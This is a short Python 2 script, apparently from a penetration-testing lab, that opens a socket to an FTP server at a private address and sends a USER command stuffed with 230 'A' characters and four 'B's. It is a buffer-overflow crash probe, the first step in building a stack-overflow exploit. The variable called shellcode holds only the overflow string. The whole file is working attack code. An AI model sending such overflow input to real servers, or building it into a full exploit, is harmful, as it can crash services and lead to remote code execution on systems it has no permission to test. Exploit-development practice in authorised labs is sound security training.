#!/usr/bin/python
import sys
import socket

crash = "A" * 230 + "B" * 4
shellcode = crash

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('10.11.23.92',21))
	s.recv(1024)
	message='USER ' + shellcode + '\r\n'
	s.send(message)
	s.send('QUIT\r\n')
	s.close()

except:
	print "Error connecting to remote machine."
	sys.exit() 